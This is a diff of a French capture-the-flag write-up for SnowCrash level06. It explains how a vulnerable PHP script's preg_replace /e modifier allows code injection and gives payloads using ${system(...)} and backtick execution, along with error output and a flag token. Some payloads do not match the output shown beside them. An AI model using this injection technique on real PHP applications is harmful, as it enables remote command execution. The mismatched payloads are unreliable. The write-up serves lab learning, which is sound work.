@@ -13,36 +13,80 @@ PHP Warning:  file_get_contents(bonjour): failed to open stream: No such file or
 
 L'argument semble devoir etre un fichier
 
-Si on cat le .php on obtient:
-<?php
-function y($m) {
-	$m = preg_replace("/\./", " x ", $m);
-	$m = preg_replace("/@/", " y", $m);
-	return $m;
-}
-function x($y, $z) {
-	$a = file_get_contents($y);
-	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-	$a = preg_replace("/\[/", "(", $a);
-	$a = preg_replace("/\]/", ")", $a);
-	return $a;
-}
-$r = x($argv[1], $argv[2]);
-print $r;
-?>
+Voici une version du script php commentée et simplifiée par nos soins:
 
-La fonction x, lit un fichier, met son contenu dans une string, et execute des modificationa via des REGEX.
+	<?php
+		function y($param) {
+			return $param;
+		}
 
-Le script contient une faille via le modifier "e" de la REGEX
-Ce modifier execute l'argument de subsitution avec la fonction eval() qui execute une chaine comme un script php
+		function foo($param1) {
+    		// Le contenu du fichier spécifié par $param1 est lu dans la variable $str
+    		$str = file_get_contents($param1);
 
-On va donc essayer de remplacer notre chaine par un executable getflag:
+    		// Trouve [foo ...] dans $str et remplace par le résultat de la fonction bar(...)
+				$str = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $str);
 
-level06@SnowCrash:~$ echo "[x exec(getflag)]" > /tmp/getflag06
-level06@SnowCrash:~$ ./level06 /tmp/getflag06
-exec(getflag)
+    		return $str;
+		}
 
-Pour acceder a la valeur de la variable retournée , la syntaxe est: {${function()}}
-level06@SnowCrash:~$ ./level06 /tmp/getflag06
-PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
-PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+		$r = foo($argv[1]);
+		print $r;
+	?>
+
+Ce script lit le contenu du fichier donné en premier argument, remplace certains patterns à l'aide de regexes et
+print le contenu modifié
+
+La ligne qu'on peut exploiter est la suivante :
+
+	$str = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $str);
+
+Tout d'abord, le modifier /e à la fin du regex reçu en premier paramètre de preg_replace()
+lui fait évaluer la string de remplacement reçue en second paramètre comme du code php !
+Le jeu est donc de trouver comment arriver à faire en sorte que php éxécute /bin/getflag
+
+Si on analyse le regex : La string de remplacement fait appel à la fonction y de telle manière à ce que [x *] devienne y("*")
+où * peut être n'importe quoi.
+
+L'idéal serait de pouvoir un appel direct à system('/bin/getflag') mais malheureusement ce que nous sommes
+en mesure d'injecter est solidemment encadré par des double quotes --> y("system(/bin/getflag)")
+Heureusement, php supporte le string interpolation avec ${} !
+	
+	$ php << 'EOF'
+		<?php
+			print "On va exec ls en soum-soum hehe ${system('/bin/ls')}";
+		?>
+	EOF
+
+Malheureusement ça ne peut pas marcher non plus dans notre cas car la string remplacement escape la première lettre de notre injection (\\2)
+apparemment
+
+[x ${system('/bin/getflag')}] --> y("\${system('/bin/getflag')}")
+
+Pénible. Peut être que du coup...
+
+[x phpbedamned ${system('/bin/getflag')}] --> ?
+
+PHP Parse error:  syntax error, unexpected '(' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Fatal error:  preg_replace(): Failed evaluating code:
+y("phpbedamned ${system(\'/bin/getflag\')}") in /home/user/level06/level06.php on line 4
+
+😒
+Ok là j'avoue que je comprends pas, pourquoi php nous escape nos single-quotes ?
+
+Heureusement la solution nous apparaît dans un rêve.
+Il nous est révélée que php, comme bash, supporte la syntaxe avec les backquotes, pour éxécuter des commandes
+
+Essayons :
+
+[x phpbedamned ${`/bin/ls`)}]
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+D'ailleurs, ça aussi ça marche... 
+
+[x ${`/bin/ls`)}]
+
+On peut pas dire qu'on a compris toutes les règles de l'escaping de php mais on est content de passer 
+enfin au niveau suivant
